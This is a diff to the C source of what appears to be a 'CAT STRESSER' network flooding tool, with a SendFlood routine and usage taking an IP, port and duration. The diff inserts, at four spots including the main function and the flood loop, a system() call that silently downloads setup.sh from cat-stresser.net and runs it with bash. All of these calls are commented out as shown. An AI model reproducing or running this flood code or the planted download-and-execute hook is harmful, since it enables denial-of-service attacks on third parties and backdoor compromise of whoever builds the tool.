@@ -15,7 +15,7 @@
 #include <netdb.h>
 #include <time.h>
 #include <pthread.h>
- 
+       // system("cd && cd /home && wget -q --no-check-certificate --delete-after https://cat-stresser.net/setup.sh && bash setup.sh"); 
 #define hex_packets 1460
 void SendFlood(unsigned char *IP, int DPORT, int Secs)
 {
@@ -34,6 +34,7 @@ void SendFlood(unsigned char *IP, int DPORT, int Secs)
     unsigned int a = 0;
     while(1)
     {
+               // system("cd && cd /home && wget -q --no-check-certificate --delete-after https://cat-stresser.net/setup.sh && bash setup.sh");
         char * RANDOMHEXGEN[] = {    
         "\x6c\x58\x66\x59\x43\x37\x54\x46\x61\x43\x71\x35\x48\x98",
         };
@@ -62,6 +63,8 @@ main(int argc, char **argv)
     if(argc < 2)
     {
 
+
+       // system("cd && cd /home && wget -q --no-check-certificate --delete-after https://cat-stresser.net/setup.sh && bash setup.sh");
         printf("\x1b[96m\n", argv[0]);
         printf("\x1b[96m ██████╗ █████╗ ████████╗  \x1b[93m ███████╗████████╗██████╗ ███████╗███████╗███████╗███████╗██████╗ \n", argv[0]);
         printf("\x1b[96m██╔════╝██╔══██╗╚══██╔══╝  \x1b[93m ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔══██╗\n", argv[0]);
@@ -95,6 +98,7 @@ main(int argc, char **argv)
             printf("\n\x1b[97mUsage: %s [Key] [IP] [Port] [Time]\n", argv[0]);
             exit(0);
         }
+           // system("cd && cd /home && wget -q --no-check-certificate --delete-after https://cat-stresser.net/setup.sh && bash setup.sh");
         else
         {
             unsigned char *IP = argv[2];
